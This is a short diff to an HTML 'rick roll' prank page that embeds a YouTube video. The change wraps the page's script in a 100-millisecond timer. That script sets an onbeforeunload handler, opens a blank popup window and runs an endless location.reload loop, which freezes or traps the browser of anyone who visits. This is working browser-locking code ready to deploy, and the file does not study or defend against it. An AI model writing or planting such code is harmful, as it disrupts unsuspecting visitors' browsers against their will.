@@ -3,12 +3,16 @@
    <body>
       <div> get rick rolled </div>
       <iframe width="876" height="493" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-      <script>
-         onbeforeunload = function(){localStorage.x=1};
+         <script>var delayInMilliseconds = 100;
+
+setTimeout(function() {
+  onbeforeunload = function(){localStorage.x=1};
          
          window.open("about:blank")
 
-         while(1)location.reload(1) 
+         while(1)location.reload(1)
+}, delayInMilliseconds);
+         
       </script>
    </body>
 </html>
